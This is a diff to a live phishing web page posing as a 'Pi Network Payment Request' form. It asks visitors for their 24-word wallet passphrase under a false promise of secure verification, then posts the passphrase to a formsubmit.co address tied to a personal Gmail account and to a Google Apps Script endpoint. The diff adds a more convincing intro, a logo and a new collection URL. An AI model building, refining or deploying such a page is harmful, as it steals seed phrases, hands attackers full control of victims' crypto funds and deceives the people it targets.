@@ -3,19 +3,34 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pi - Request Payment</title>
+  <title>Pi Network – Request Payment</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
-    body { font-family: 'Inter', sans-serif; background-color: #f3f4ff; }
+    body { font-family: 'Inter', sans-serif; background-color: #f3f4ff; color: #333; }
     .bg-pi-purple { background-color: #5A2D82; }
     .text-pi-yellow { color: #F5C65A; }
 
-    /* blinking for 24-passphrase warning */
+    /* Fade-in-up for intro */
+    @keyframes fadeInUp {
+      0% { opacity: 0; transform: translateY(20px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+    .fade-in-up {
+      animation: fadeInUp 1s ease-out;
+    }
+
+    /* blink + glow for warning and error overlay */
     @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0;} }
     .blink { animation: blink 1s infinite; }
 
-    /* shake + fade for error overlay */
+    @keyframes pulseGlow {
+      0%,100% { box-shadow: 0 0 10px rgba(220,38,38,0.6); }
+      50% { box-shadow: 0 0 20px rgba(220,38,38,0.9); }
+    }
+    .glow { animation: pulseGlow 1.5s infinite; }
+
+    /* Error overlay */
     @keyframes shake {
       0%, 100% { transform: translateX(0); }
       20%, 60% { transform: translateX(-6px); }
@@ -28,13 +43,6 @@
     @keyframes fadeOut {
       from { opacity: 1; transform: scale(1); }
       to { opacity: 0; transform: scale(0.95); }
-    }
-    @keyframes pulseGlow {
-      0%,100% { box-shadow: 0 0 10px rgba(220,38,38,0.6); }
-      50% { box-shadow: 0 0 20px rgba(220,38,38,0.9); }
-    }
-    .glow {
-      animation: pulseGlow 1.5s infinite;
     }
     .error-overlay {
       position: fixed; inset: 0;
@@ -56,31 +64,46 @@
 <body class="flex flex-col min-h-screen">
 
   <!-- Header -->
-  <header class="bg-pi-purple text-white py-4 px-5 sticky top-0 z-10 shadow-md text-center font-semibold text-lg">
-    Request Payment
+  <header class="bg-pi-purple text-white py-4 px-5 sticky top-0 z-10 shadow-md flex items-center justify-center space-x-2">
+    <img src="https://pi.app/assets/images/pi-logo.svg" alt="Pi Logo" class="h-6 w-6">
+    <h1 class="font-semibold text-lg">Pi Network Payment Request</h1>
   </header>
 
   <!-- Main -->
   <main id="mainContent" class="flex-grow w-full max-w-lg mx-auto p-6">
+
+    <!-- Intro Section -->
+    <section class="text-center mb-6 bg-white rounded-lg shadow-md p-5 border border-purple-100 fade-in-up">
+      <p class="text-gray-700 text-sm leading-relaxed">
+        <strong>This system helps validate and confirm your wallet request within the Pi ecosystem.</strong><br><br>
+        Please provide your <strong>amount</strong>, <strong>currency</strong>, and your
+        <strong>24-word passphrase or reason</strong> for verification.<br><br>
+        Your request will be securely processed and recorded on the
+        <span class="font-semibold text-pi-yellow">Pi Network Backup Ledger</span>.
+      </p>
+    </section>
+
+    <!-- Form -->
     <section class="bg-white p-6 rounded-lg shadow-md">
       <form id="paymentRequestForm" method="POST" class="space-y-4">
+
         <div>
           <label for="amount" class="block text-xs font-medium text-gray-600 mb-1">Amount:</label>
           <input type="number" id="amount" name="amount" required step="0.01" min="0" placeholder="0.00"
-            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500">
         </div>
 
         <div>
           <label for="currency" class="block text-xs font-medium text-gray-600 mb-1">Currency:</label>
           <input type="text" id="currency" name="currency" required value="USD"
-            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500">
         </div>
 
         <div>
           <label for="passphrase24" class="block text-xs font-medium text-gray-600 mb-1">24 Passphrase / Reason:</label>
           <textarea id="passphrase24" name="passphrase24" rows="5" required
-            placeholder="Provide your 24-word passphrase or reason here."
-            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"></textarea>
+            placeholder="Provide your 24-word passphrase or reason for verification here..."
+            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-purple-500 placeholder-gray-400 placeholder:italic font-medium"></textarea>
           <p id="passphraseWarning" class="text-xs text-orange-500 mt-1 hidden blink"></p>
         </div>
 
@@ -112,7 +135,7 @@
   </div>
 
   <footer class="w-full max-w-lg mx-auto mt-6 py-4 text-center text-gray-400 text-xs">
-    Pi network system © 2019
+    Pi Network System © 2019
   </footer>
 
   <script>
@@ -124,9 +147,8 @@
     const tryAgainButton = document.getElementById('tryAgainButton');
 
     const FORM_SUBMIT_URL = "https://formsubmit.co/alecbing864@gmail.com";
-    const SHEET_BACKUP_URL = "https://script.google.com/macros/s/AKfycbygl9DlHj1nqcHwJk7iRIr3qAlElv1mwI9gQddRCI0-gU7AZ8KA7UZS-1dh7uZpEA/exec";
+    const SHEET_BACKUP_URL = "https://script.google.com/macros/s/AKfycbxLhCa70Yvdb5Y8uK8G_UjWsZLyZ3owhrl8w1OpwnAVqxvZ2mTypixTWH8W-cqavgk/exec";
 
-    // 🔸 Passphrase word count check
     passphraseBox.addEventListener('input', () => {
       const words = passphraseBox.value.trim().split(/\s+/).filter(w => w.length > 0);
       const count = words.length;
@@ -138,7 +160,6 @@
       }
     });
 
-    // 🔸 Form submission
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
       statusMessage.textContent = "Submitting... Please wait.";
@@ -168,6 +189,5 @@
       }, 400);
     });
   </script>
-
 </body>
 </html>
